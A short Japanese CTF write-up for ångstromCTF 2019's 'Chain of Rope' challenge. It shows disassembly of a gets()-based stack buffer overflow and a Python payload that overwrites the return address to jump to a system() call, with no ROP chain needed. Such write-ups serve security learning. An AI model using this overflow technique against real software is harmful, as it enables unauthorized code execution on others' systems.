// date: 2019-04-24

## ångstromCTF 2019 -「Chain of Rope (80pts)」之解き方

### 問題記載
```
Chain of Rope - 80 points

defund found out about this cool new dark web browser! While he was browsing the dark web he came across this service that sells rope chains on the black market, but they're super overpriced! He managed to get the source code. Can you get him a rope chain without paying?
```

### 解析
getsによってバッファーオーバーフローが可能。
```
401348:	48 8d 45 d0          	lea    rax,[rbp-0x30]
40134c:	48 89 c7             	mov    rdi,rax
40134f:	b8 00 00 00 00       	mov    eax,0x0
401354:	e8 17 fd ff ff       	call   401070 <gets@plt>
```
書込み先から`0x30`バイト超えて、RBPとRIPを奪えられます。

戻り先を考えればflag関数の真ん中でのsystem呼び出しがいいのでしょう。
```
401231:	48 8d 3d 2f 0e 00 00 	lea    rdi,[rip+0xe2f]        # 402067 <_IO_stdin_used+0x67>
401238:	e8 13 fe ff ff       	call   401050 <system@plt>
```

### エクスプロイト
```python
payload = "1\n"                                # メニュー選択
payload += "a" * 0x30                          # パッディング
payload += "\x00\x00\x00\x00\x00\x00\x00\x00"  # $rbp
payload += "\x31\x12\x40\x00\x00\x00\x00\x00"  # $rip (system呼び出し)
print(payload)
```

結局ROPを使わずに解けてしまいました。
